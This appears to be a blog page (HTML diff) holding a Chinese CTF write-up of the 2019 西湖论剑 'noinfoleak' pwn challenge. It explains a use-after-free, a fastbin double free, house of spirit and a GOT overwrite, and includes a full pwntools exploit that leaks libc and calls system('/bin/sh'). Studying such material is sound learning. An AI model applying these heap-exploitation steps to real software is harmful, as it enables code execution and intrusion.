@@ -1,0 +1,361 @@
+<!DOCTYPE html>
+<html>
+  
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="utf-8">
+  <meta name="author" content="starsdestinations">
+  
+  
+  <title>2019-4-18-noinfoleak | Hexo</title>
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  
+    <meta name="keywords" content="Hexo, Theme-AD">
+  
+
+  
+  <meta name="description" content="starsdestinations的小站">
+
+  
+
+  <script src="//cdn.jsdelivr.net/npm/leancloud-storage@3.11.1/dist/av-min.js" async></script>
+
+  
+    <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML" async></script>
+  
+
+  
+    <script src="//unpkg.com/valine/dist/Valine.min.js" async></script>
+  
+
+  
+
+  <script>
+  // theme-ad's config script
+  // it can be used in every script
+  
+  window.AD_CONFIG = {
+    leancloud: {"appid":"Hyq9wkH495DgNHWhDQCOfQSp-gzGzoHsz","appkey":"WaR7nrzhliHj9aVwdQzkdlGd","comment":true,"count":true},
+    welcome: {"enable":false,"interval":30},
+    start_time: "2019-03-13",
+    passwords: ["efe07af7441da2b69c4a41e42e73be4db47f66010a56900788a458354a7373ec", ],
+    is_post: true,
+    lock: false,
+    author: "starsdestinations",
+    share: {"twitter":false,"facebook":false,"weibo":false,"qq":true,"wechat":true},
+    mathjax: true,
+    page_type: "",
+    root: "/"
+  };
+</script>
+
+  <script src="/vendor/sha256.min.js"></script>
+<script src="/js/auth.js"></script>
+<script src="/js/index.js"></script>
+<script src="/vendor/qrcode.min.js"></script>
+
+  
+    <link rel="icon" href="/images/favicon.ico">
+    <link rel="apple-touch-icon" href="/images/touch-icon.png">
+  
+
+  <link href="//netdna.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
+
+  <link rel="stylesheet" href="/css/index.css">
+<link rel="stylesheet" href="/styles/components/highlight/highlight.css">
+
+  
+</head>
+  <body>
+    <header class="site-header">
+  <div class="site-header-brand">
+    
+      <span class="site-header-brand-title">
+        <a href="/">starsdestinations</a>
+      </span>
+    
+    
+      <span class="site-header-brand-motto"> | 自学历程</span>
+    
+  </div>
+  <div class="site-header-right">
+    <nav class="site-header-navigation">
+      
+        <a href="/" target="_self">首页</a>
+      
+        <a href="/archives/" target="_self">归档</a>
+      
+        <a href="/tags/" target="_self">标签</a>
+      
+        <a href="/categories/" target="_self">分类</a>
+      
+        <a href="/friends/" target="_self">友链</a>
+      
+        <a href="/about/" target="_self">关于</a>
+      
+    </nav>
+    <div class="site-header-btn">
+      
+        <a href="https://github.com/starsdestinations/" target="_blank" id="site-github">
+          <i class="fa fa-github-alt"></i>
+        </a>
+      
+      <a href="javascript:void(0);" id="site-search">
+        <i class="fa fa-search"></i>
+      </a>
+      <a href="javascript:void(0);" id="site-nav-btn">
+        <i class="fa fa-ellipsis-v"></i>
+      </a>
+    </div>
+  </div>
+</header>
+<nav class="table-content" id="site-nav">
+  <div class="table-content-title">
+    <span>导航</span>
+  </div>
+  <div class="table-content-main">
+    <ol class="toc">
+      
+        <li class="toc-item">
+          <a href="/" target="_self">
+            首页
+          </a>
+        </li>
+      
+        <li class="toc-item">
+          <a href="/archives/" target="_self">
+            归档
+          </a>
+        </li>
+      
+        <li class="toc-item">
+          <a href="/tags/" target="_self">
+            标签
+          </a>
+        </li>
+      
+        <li class="toc-item">
+          <a href="/categories/" target="_self">
+            分类
+          </a>
+        </li>
+      
+        <li class="toc-item">
+          <a href="/friends/" target="_self">
+            友链
+          </a>
+        </li>
+      
+        <li class="toc-item">
+          <a href="/about/" target="_self">
+            关于
+          </a>
+        </li>
+      
+    </ol>
+  </div>
+</nav>
+<div id="site-process"></div>
+    <main>
+      
+  <div class="passage">
+  <div class="passage-meta">
+    <span>
+      <i class="fa fa-calendar"></i>2019-04-19
+    </span>
+    
+    
+      <span>
+        | <i class="fa fa-unlock-alt"></i>UNLOCK
+      </span>
+    
+  </div>
+  <h1 class="passage-title">
+    2019-4-18-noinfoleak
+  </h1>
+  
+  <article class="passage-article">
+    <h2 id="2019西湖论剑杯pwn-noinfoleak"><a href="#2019西湖论剑杯pwn-noinfoleak" class="headerlink" title="2019西湖论剑杯pwn-noinfoleak"></a>2019西湖论剑杯pwn-noinfoleak</h2><p>这题在比赛的时候没能做出来，借着这道题学习一下fastbin attack的doublefree和house of spirit<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  sub_400846();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">putchar</span>(<span class="number">62</span>);</span><br><span class="line">          v4 = sub_4008A7();</span><br><span class="line">          <span class="keyword">if</span> ( v4 != <span class="number">1</span> )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          add();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( v4 != <span class="number">2</span> )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">delete</span>();</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( v4 != <span class="number">3</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      edit();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v4 == <span class="number">4</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"No Such Choice"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>题目逻辑很清楚，就三个功能，添加表，编辑表，删除表，漏洞在删除表<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">delete</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v0; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">putchar</span>(<span class="number">62</span>);</span><br><span class="line">  v0 = sub_4008A7();</span><br><span class="line">  <span class="keyword">if</span> ( v0 &gt;= <span class="number">0</span> &amp;&amp; v0 &lt;= <span class="number">15</span> )</span><br><span class="line">    <span class="built_in">free</span>(qword_6010A0[<span class="number">2</span> * v0]);<span class="comment">//free后没有置0，存在uaf</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>这里可以使用fastbin的double free实现任意地址写，大致原理就是：fastbin是一个后进先出（LIFO）的单向链表，chunk大小包含16-80byte，只有一个fd指针，当我们malloc两个chunk，然后按照第一、第二、第一的顺序free，就会发现两个chunk的fd各自指向对方，这就存在double free。<br>这时候只要使用house of spirit技术，也就是申请相同大小的栈，并且加上数据fake_chunk_addr，然后接着再连续申请两次，第四次申请的时候就会把fake_chunk_addr作为一个chunk分配给你。<br>fake_chunk_addr只要满足几个条件，其中一个是fake_chunk_addr的size段要符合fastbin，而且要满足malloc的要求，这一题只需要知道这两点（其它条件我一时搞不明白），这里所谓的double free就是两次free同一个chunk从而能分配到一个fake_chunk，但是不能连续free同一个chunk两个，这会触发警报，而且free的chunk的fd不能指向自身。<br>这一题我们会发现在index数组(0x6010a0)的上方0x60108d处有一个0x7f，正好符合fastbin的size，我们可以利用double free使得(0x60108d-8)进入index数组，然后通过edit函数对(0x60108d-8）进行写入，然后就能随意地修改index数组，让各个index指向我们想要的地址。<br>虽然能进行任意写了，但是这题没有能泄露信息的函数，这就需要我们自己构造info leak了，其中一个方法是把已有的函数比如free的got表内容改成puts_plt，这样调用free时就会变成free-&gt;free_plt-&gt;free_got-&gt;puts_plt-&gt;puts_got（这里的原理我不清楚）,从而调用puts，这时候index数组的地址值原本是在delete函数中作为free的参数的，现在变成了puts的参数，因此我们可以把puts_got的值通过之前的house of spirit放入index数组中，然后更改free_got表，之后调用delete函数就能泄露出puts的实际地址了（got表中存储着函数的真实地址），然后就能计算base_addr，之后得到system_addr，把free_got的内容再修改成system_addr的值，这时候add(0x20,”/bin/sh\00”)，那么index数组里面就多出了一个/bin/sh字符串的地址，再调用delete就好了。<br>exp如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line"><span class="comment">#context.terminal = ["tmux", "splitw", "-h"] </span></span><br><span class="line">sh=process(<span class="string">'./noinfoleak'</span>)</span><br><span class="line">elf=ELF(<span class="string">'./noinfoleak'</span>)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">putsPlt=elf.plt[<span class="string">'puts'</span>]</span><br><span class="line">putsGot=elf.got[<span class="string">'puts'</span>]</span><br><span class="line">freeGot=elf.got[<span class="string">'free'</span>]</span><br><span class="line">log.info(<span class="string">'puts:%x'</span>%(putsPlt))</span><br><span class="line">log.info(<span class="string">'free:%x'</span>%(freeGot))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(Size,context)</span>:</span></span><br><span class="line">    sh.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">    sh.sendline(<span class="string">'1'</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">    sh.sendline(str(Size))</span><br><span class="line">    sh.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">    sh.sendline(context)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span><span class="params">(idx)</span>:</span></span><br><span class="line">    sh.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">    sh.sendline(<span class="string">'2'</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">    sh.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,context)</span>:</span></span><br><span class="line">    sh.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">    sh.sendline(<span class="string">'3'</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">    sh.sendline(str(idx))</span><br><span class="line">    sh.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">    sh.send(context)</span><br><span class="line">gdb.attach(sh)</span><br><span class="line">add(<span class="number">96</span>,<span class="string">'aaaa'</span>)  <span class="comment">#0</span></span><br><span class="line">add(<span class="number">96</span>,<span class="string">'bbbb'</span>)  <span class="comment">#1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#double free</span></span><br><span class="line">dele(<span class="number">0</span>)  </span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">targetAddr=p64(<span class="number">0x60108d</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>,targetAddr) <span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">'bbbb'</span>)     <span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">'cccc'</span>)     <span class="comment">#4</span></span><br><span class="line"><span class="comment">#fake chunk to bss</span></span><br><span class="line">payload=<span class="string">'\x00'</span>*(<span class="number">3</span>+<span class="number">16</span>)+p64(freeGot)+p64(<span class="number">96</span>)+p64(putsGot)+p64(<span class="number">96</span>)</span><br><span class="line">add(<span class="number">0x60</span>,payload)   <span class="comment">#5  </span></span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(putsPlt))  <span class="comment"># freeGot-&gt;putsPlt</span></span><br><span class="line"></span><br><span class="line">dele(<span class="number">1</span>) <span class="comment">#puts(putsAddr)</span></span><br><span class="line">putsaddr=u64(sh.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\0'</span>))</span><br><span class="line">log.info(<span class="string">'putsAddr:%x'</span>%(putsaddr))</span><br><span class="line">libcAddr=putsaddr-libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line">log.info(<span class="string">'libcAddr:%x'</span>%(libcAddr))</span><br><span class="line">systemAddr=libcAddr+libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">log.info(<span class="string">'systemAddr:%x'</span>%(systemAddr))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,p64(systemAddr)) <span class="comment"># freeGot-&gt;system</span></span><br><span class="line">add(<span class="number">0x30</span>,<span class="string">'/bin/sh\x00'</span>) <span class="comment">#6</span></span><br><span class="line">dele(<span class="number">6</span>)   <span class="comment"># system('/bin/sh')</span></span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure></p>
+<p>该脚本来自 <a href="https://blog.tangent.ink/" target="_blank" rel="noopener">https://blog.tangent.ink/</a><br>我只做了很小的修改以适应我系统的堆栈，网上找的脚本没有一个能在我kali本地跑的，也不懂得为什么，因为20还有一场比赛，所以对fastbin attack的学习先到这里。<br>遗留困惑:<br>1、double free到底能分配什么样的地址？因为我实际很多地址不能用double free，都会直接在heap里给我分配。<br>2、house of spirit对fake chunk的审查机制具体是怎么样的？为什么0x7f可以满足对size的检查，这里我有查到一篇 <a href="https://www.jianshu.com/p/1c4fab29ea34" target="_blank" rel="noopener">https://www.jianshu.com/p/1c4fab29ea34</a> 讲了自己实验的几个size，似乎后四位是f就能满足size的检查了？具体我也不太明白，因为我自己实验的0x60不知道为什么不能满足。<br>3、got、plt我虽然有经过学习，但是实际具体的函数是怎样的我并没有完全弄清，像这次的连续两次plt got我就不理解是怎么实现的，按理来说got表里应该是实际地址，希望之后阅读《程序员的自我修养》能理解这一点<br>4、在我看的七八个EXP里，有用到unsortbin、IO_FILE、uaf等技术，因为我实验了好久都难以复现，所以留在困惑里。</p>
+
+  </article>
+  <aside class="table-content" id="site-toc">
+  <div class="table-content-title">
+    <i class="fa fa-arrow-right fa-lg" id="site-toc-hide-btn"></i>
+    <span>目录</span>
+  </div>
+  <div class="table-content-main">
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#2019西湖论剑杯pwn-noinfoleak"><span class="toc-text">2019西湖论剑杯pwn-noinfoleak</span></a></li></ol>
+  </div>
+</aside>
+  
+    <aside class="passage-copyright">
+      <div>本文作者: starsdestinations</div>
+      
+        <div>
+          原文链接: 
+          <a href target="_blank">http://yoursite.com/passages/2019-4-18-noinfoleak/</a>
+        </div>
+      
+      <div>
+        版权声明: 本博客所有文章除特别声明外, 均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议. 转载请注明出处!
+      </div>
+    </aside>
+  
+  
+</div>
+
+    </main>
+    
+      
+<div class="site-comment-contanier" data-plateform="leancloud">
+  
+    <p id="site-comment-info">
+      <i class="fa fa-spinner fa-spin"></i> 评论加载中
+    </p>
+    <div id="site-comment"></div>
+  
+</div>
+    
+    <div class="site-footer-wrapper">
+  <footer class="site-footer">
+    
+      <div class="site-footer-col">
+        <h5 class="site-footer-title">博客推荐</h5>
+        
+          <span class="site-footer-item">
+            <a href="https://godbmw.com/" target="_blank">GodBMW</a>
+          </span>
+        
+          <span class="site-footer-item">
+            <a href="http://ruanyifeng.com/" target="_blank">阮一峰的个人网站</a>
+          </span>
+        
+      </div>
+    
+      <div class="site-footer-col">
+        <h5 class="site-footer-title">系列教程</h5>
+        
+          <span class="site-footer-item">
+            <a href="https://godbmw.com/categories/webpack4%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B/" target="_blank">webpack4系列教程</a>
+          </span>
+        
+          <span class="site-footer-item">
+            <a href="https://godbmw.com/design-patterns/" target="_blank">设计模式手册</a>
+          </span>
+        
+      </div>
+    
+      <div class="site-footer-col">
+        <h5 class="site-footer-title">抓到我</h5>
+        
+          <span class="site-footer-item">
+            <a href="https://github.com/starsdestinations/" target="_blank">github</a>
+          </span>
+        
+      </div>
+    
+    <div class="site-footer-info">
+      <i class="fa fa-clock-o"></i> 本站已稳定运行<span id="site-time"></span>
+    </div>
+    
+      <div class="site-footer-info">
+        <i class="fa fa-paw"></i> 您是本站第 <span id="site-count"></span> 位访客
+      </div>
+    
+    
+      <div class="site-footer-info">
+        <i class="fa fa-at"></i> Email: 944641675@qq.com
+      </div>
+    
+    <div class="site-footer-info">
+      <i class="fa fa-copyright"></i> 
+      2019 <a href="https://github.com/dongyuanxin/theme-ad/" target="_blank">Theme-AD</a>.
+      Created by <a href="https://godbmw.com/" target="_blank">GodBMW</a>.
+      All rights reserved.
+    </div>
+  </footer>
+</div>
+    <div id="site-layer" style="display:none;">
+  <div class="site-layer-content">
+    <div class="site-layer-header">
+      <span class="site-layer-header-title" id="site-layer-title"></span>
+      <i class="fa fa-close" id="site-layer-close"></i>
+    </div>
+    <div class="site-layer-body" id="site-layer-container">
+      <div class="site-layer-input" id="site-layer-search" style="display: none;">
+        <input type="text">
+        <i class="fa fa-search"></i>
+      </div>
+      <div class="site-layer-reward" id="site-layer-reward" style="display: none;">
+        
+          <div>
+            <img src="/images/wechat.png" alt="WeChat">
+            
+              <p>WeChat</p>
+            
+          </div>
+        
+      </div>
+      <div id="site-layer-welcome" style="display:none;"></div>
+    </div>
+  </div>
+</div>
+    
+
+<div class="bottom-bar">
+  <div class="bottom-bar-left">
+    <a href="javascript:void(0);" data-enable="false">
+      <i class="fa fa-arrow-left"></i>
+    </a>
+    <a href="/passages/2019-4-17-近期比赛总结/" data-enable="true">
+      <i class="fa fa-arrow-right"></i>
+    </a>
+  </div>
+  <div class="bottom-bar-right">
+    <a href="javascript:void(0);" data-enable="true" id="site-toc-show-btn">
+      <i class="fa fa-bars"></i>
+    </a>
+    
+      <a href="#site-comment" data-enable="true">
+        <i class="fa fa-commenting"></i>
+      </a>
+    
+    <a href="javascript:void(0);" id="site-toggle-share-btn">
+      <i class="fa fa-share-alt"></i>
+    </a>
+    <a href="javascript:void(0);" id="site-reward">
+      <i class="fa fa-thumbs-up"></i>
+    </a>
+    <a href="javascript:void(0);" id="back-top-btn">
+      <i class="fa fa-chevron-up"></i>
+    </a>
+  </div>
+</div>
+    <div id="share-btn">
+  
+  
+  
+  
+    <a id="share-btn-qq" href="javascript:void(0);" target="_blank">
+      <i class="fa fa-qq"></i>
+    </a>
+  
+  
+    <a id="share-btn-wechat" href="javascript:void(0);" target="_blank">
+      <i class="fa fa-wechat"></i>
+    </a>
+  
+</div>
+    
+
+
+
+
+
+    
+  </body>
+</html>
